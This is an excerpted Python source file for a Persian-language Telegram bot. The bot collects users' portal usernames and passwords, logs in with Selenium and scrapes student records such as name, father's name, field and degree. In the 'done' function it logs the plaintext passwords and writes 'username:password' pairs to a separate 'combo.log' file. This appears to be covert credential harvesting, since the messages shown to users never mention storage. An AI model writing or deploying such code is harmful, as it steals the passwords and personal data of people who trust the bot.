...
logger_combo = logging.getLogger("combo")
logger_combo.setLevel(logging.DEBUG)
combo_handler = logging.FileHandler('combo.log')
combo_handler.setLevel(logging.DEBUG)
formatter_combo = logging.Formatter('%(message)s')
combo_handler.setFormatter(formatter_combo)
logger_combo.addHandler(combo_handler)
...
def start(update, context):
    ...
    logger.warning(" # %s : %s ", user.first_name, update.message.text)
    ...
    if context.user_data:
        reply_text += " قبلا اینارو بهم گفتی : \n" \
                      ...
                      "\n(اگه میخوای چیزی رو عوض کنی هم میتونی روش روش کلیک کنی و مقدار جدیدش رو وارد کنی) ".format(", ".join(context.user_data.keys()))
    else:
...
def regular_choice(update, context):
    ...
    if context.user_data.get(text):
        reply_text = 'قبلا اینو گفته بودی : \n' \
                     '{} : {} \n' \
                     'خب حالا مقدار جدیدش رو وارد کن \n' \
...
def received_information(update, context):
    ...
    update.message.reply_text("تا الان اینارو بهم گفتی :"
                              "{}"
                              "ادامه بده \n"
                              "(واسه عوض کردن مشخصاتت هم میتونی روش کلیک کنی و مقدار جدیدش رو وارد کنی)".format(facts_to_str(context.user_data)),
                              reply_markup=markup)
...
def done(update, context):
    ...
    update.message.reply_text("مشخصاتت :"
                              ...
                              "ممکنه یکم طول بکشه".format(facts_to_str(context.user_data)))
    ...
    def info_log():
        client_name = driver.find_element_by_xpath("/html/body/form/div[3]/div[1]/div/div/div[1]/div[2]/div[1]/h3/span[2]").get_attribute('innerHTML')
        client_father_name = driver.find_element_by_xpath("/html/body/form/div[3]/div[1]/div/div/div[1]/div[2]/div[2]/span[6]").get_attribute('innerHTML')
        client_current_term = driver.find_element_by_xpath("/html/body/form/div[3]/div[1]/div/div/div[1]/div[2]/div[2]/span[4]").get_attribute('innerHTML')
        client_field = driver.find_element_by_xpath("/html/body/form/div[3]/div[1]/div/div/div[1]/div[2]/div[2]/span[10]").get_attribute('innerHTML')
        client_degree = driver.find_element_by_xpath("/html/body/form/div[3]/div[1]/div/div/div[1]/div[2]/div[2]/span[12]").get_attribute('innerHTML')

        logger.info(" # Name : %s ", client_name)
        logger.info(" # Father's name : %s ", client_father_name)
        logger.info(" # Current term : %s ", client_current_term)
        logger.info(" # Field of study : %s ", client_field)
        logger.info(" # Degree : %s # ", client_degree)

        logger.info(" # Username : %s ", facts_to_str.username)
        logger.info(" # Password : %s ", facts_to_str.password)
        logger.info(" # Term : %s ", facts_to_str.term)
    ...
    logger_combo.info("%s:%s", facts_to_str.username, facts_to_str.password)
